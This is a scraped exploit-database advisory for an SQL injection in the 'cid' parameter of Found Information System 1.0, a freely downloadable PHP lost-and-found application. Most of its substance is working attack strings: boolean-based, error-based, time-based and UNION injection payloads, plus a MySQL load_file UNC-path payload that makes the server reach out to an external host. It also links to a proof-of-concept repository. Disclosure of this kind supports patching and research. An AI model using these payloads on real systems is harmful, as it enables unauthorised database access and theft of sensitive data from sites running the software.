---
title: Found Information System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023050018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-09
fetch_date: 2025-10-04T11:36:46.251842
---

# Found Information System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Found Information System 1.0 SQL Injection** **2023.05.08**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Found Information System 1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 05.07.2023
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `cid` parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load\_file('%5c%5c%5c%5c446j46zi440491hdrco5ywxzhttps://www.sourcecodester.com/user/257130/activity%5c%5coca'))+'
was submitted in the cid parameter. This payload injects a SQL
sub-query that calls MySQL's load\_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed.
The attacker can get susceptible - sensitive information about the
system, then he can perform another more dangerous attack.
STATUS: HIGH Vulnerability
[+]Payload:
```mysql
---
Parameter: cid (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: page=items&cid=-9014' OR 4485=4485 AND 'MLAS'='MLAS
Type: error-based
Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
Payload: page=items&cid=-3437' OR 1 GROUP BY
CONCAT(0x71786b7171,(SELECT (CASE WHEN (5811=5811) THEN 1 ELSE 0
END)),0x71627a6b71,FLOOR(RAND(0)\*2)) HAVING MIN(0)#
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: page=items&cid=2'+(select
load\_file('\\\\446j46zi440491hdrco5ywxzhttps://www.sourcecodester.com/user/257130/activity\\oca'))+''
AND (SELECT 9471 FROM (SELECT(SLEEP(3)))atkh) AND 'RWRl'='RWRl
Type: UNION query
Title: MySQL UNION query (UTF8) - 5 columns
Payload: page=items&cid=2'+(select
load\_file('\\\\446j46zi440491hdrco5ywxzhttps://www.sourcecodester.com/user/257130/activity\\oca'))+''
UNION ALL SELECT
'UTF8',CONCAT(0x71786b7171,0x506f70715a457a794d7641625051436b4c4a52576d51645242665863795a6f594d4843426d654b46,0x71627a6b71),'UTF8','UTF8','UTF8','UTF8'#
---
```
## Proof and Exploit:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Lost-and-Found-Information-1.0)
## Time spend:
00:37:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top